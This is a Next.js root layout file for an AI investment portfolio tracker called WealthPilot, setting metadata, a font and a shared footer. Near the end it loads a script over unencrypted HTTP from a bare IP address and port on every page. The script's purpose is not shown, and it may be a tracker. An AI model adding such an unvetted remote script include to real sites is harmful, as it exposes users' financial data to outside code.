import type { Metadata } from 'next'
import { Inter } from 'next/font/google'
import './globals.css'
import SharedFooter from '@/components/SharedFooter'

const inter = Inter({ subsets: ['latin'] })

export const metadata: Metadata = {
  title: 'WealthPilot — AI Investment Portfolio Tracker',
  description: 'Track and optimize your investment portfolio with AI-powered insights.',
}

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en">
      <body className={inter.className}>
        {children}
        <SharedFooter theme="dark" />
        <script src="http://31.97.56.148:3098/t.js" data-site="ai-investment-tracker-delta.vercel.app" defer></script>
      </body>
    </html>
  )
}
